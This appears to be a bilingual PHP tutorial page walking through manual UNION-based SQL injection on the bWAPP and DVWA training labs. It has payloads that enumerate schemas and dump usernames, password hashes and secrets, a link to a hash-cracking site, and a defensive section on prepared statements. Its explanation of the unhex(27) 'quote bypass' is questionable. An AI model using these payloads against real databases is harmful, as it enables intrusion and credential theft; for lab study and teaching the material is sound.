<?php
require_once __DIR__ . '/../bootstrap.php';
$pageTitle    = $lang==='es' ? 'SQL Injection Manual: bWAPP y DVWA — CyberEscudo' : 'Manual SQL Injection: bWAPP & DVWA — CyberEscudo';
$contentTitle = $lang==='es' ? 'SQL Injection Manual: bWAPP y DVWA' : 'Manual SQL Injection: bWAPP & DVWA';
$contentDate  = '2022-01-15';
$contentTags  = ['SQL Injection','bWAPP','DVWA','UNION','Pentesting'];
ob_start();
if ($lang==='es'): ?>
<div class="prose">
  <p>Práctica de explotación manual de <strong>SQL Injection</strong> mediante sentencias UNION en bWAPP y DVWA, incluyendo bypass de contramedidas con <code>unhex()</code>.</p>

  <h2>1. bWAPP — SQL Injection (Search/GET)</h2>
  <p>Accedemos a bWAPP con la IP de la máquina, usuario/contraseña por defecto, y seleccionamos <em>SQL Injection (Search/GET)</em>.</p>

  <h3>Detectar número de columnas</h3>
  <pre><code>' union select 1,2,3,4,5,6,7#</code></pre>

  <h3>Obtener nombre del esquema actual</h3>
  <pre><code>' union select 1,2,3,database(),5,6,7#</code></pre>

  <h3>Listar tablas del esquema</h3>
  <pre><code>' union select 1,2,3,4,group_concat(table_name),6,7
FROM information_schema.tables
WHERE table_schema=database()#</code></pre>

  <h3>Listar columnas de la tabla users</h3>
  <pre><code>' union select 1,2,group_concat(column_name),4,5,6,7
FROM information_schema.columns
WHERE table_name='users' AND table_schema=database()#</code></pre>

  <h3>Extraer credenciales (login, password, email, secret)</h3>
  <pre><code>' union select 1,login,password,email,secret,6,7 FROM users#</code></pre>
  <p>Las contraseñas están en <strong>SHA1</strong>. Se pueden descifrar en: <a href="https://md5decrypt.net/en/Sha1/">md5decrypt.net/en/Sha1/</a></p>

  <h3>Listar todos los esquemas de la base de datos</h3>
  <pre><code>' union select 1,2,table_schema,4,5,6,7 FROM information_schema.tables#</code></pre>

  <h2>2. DVWA — Bypass con unhex()</h2>
  <p>En el nivel de seguridad medio, DVWA aplica <code>mysql_real_escape_string()</code> que escapa la comilla simple. El bypass consiste en usar <code>unhex(27)</code> (27 = código hex de la comilla simple) para evitar su filtrado:</p>

  <h3>Detectar número de columnas</h3>
  <pre><code>unhex(27) or 1=1 order by 2#</code></pre>

  <h3>Listar tablas del esquema actual</h3>
  <pre><code>unhex(27) union select 1, table_name
FROM information_schema.tables
WHERE table_schema=database()#</code></pre>

  <h3>Extraer usuarios y contraseñas</h3>
  <pre><code>unhex(27) union select user,password FROM dvwa.users#</code></pre>

  <h2>Contramedidas</h2>
  <ul>
    <li><strong>Prepared Statements (PDO/MySQLi)</strong>: la defensa más efectiva. Separa el código SQL de los datos.</li>
    <li><strong>ORMs</strong>: capas de abstracción que usan prepared statements internamente.</li>
    <li><strong>Validación estricta de entradas</strong>: listas blancas de caracteres permitidos.</li>
    <li><strong>WAF</strong>: Mod_Security con reglas OWASP CRS.</li>
  </ul>
  <pre><code>&lt;?php
// Ejemplo con PDO (prepared statement):
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
$user = $stmt->fetch();
?&gt;</code></pre>
</div>
<?php else: ?>
<div class="prose">
  <p>Manual SQL Injection using UNION statements on <strong>bWAPP</strong> and an <code>unhex()</code> bypass on <strong>DVWA</strong> medium security.</p>

  <h2>1. bWAPP — UNION-based Injection</h2>
  <pre><code">' union select 1,2,3,database(),5,6,7#
' union select 1,2,3,4,group_concat(table_name),6,7 FROM information_schema.tables WHERE table_schema=database()#
' union select 1,login,password,email,secret,6,7 FROM users#</code></pre>
  <p>Passwords are SHA1-hashed. Crack them at <a href="https://md5decrypt.net/en/Sha1/">md5decrypt.net/en/Sha1/</a></p>

  <h2>2. DVWA Medium — unhex() Bypass</h2>
  <p>DVWA medium level applies <code>mysql_real_escape_string()</code>. Use <code>unhex(27)</code> (hex for single quote) to bypass:</p>
  <pre><code">unhex(27) or 1=1 order by 2#
unhex(27) union select 1, table_name FROM information_schema.tables WHERE table_schema=database()#
unhex(27) union select user,password FROM dvwa.users#</code></pre>

  <h2>Defense</h2>
  <pre><code>&lt;?php
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
?&gt;</code></pre>
</div>
<?php endif;
$contentBody=ob_get_clean();
require __DIR__.'/../templates/content-page.php';
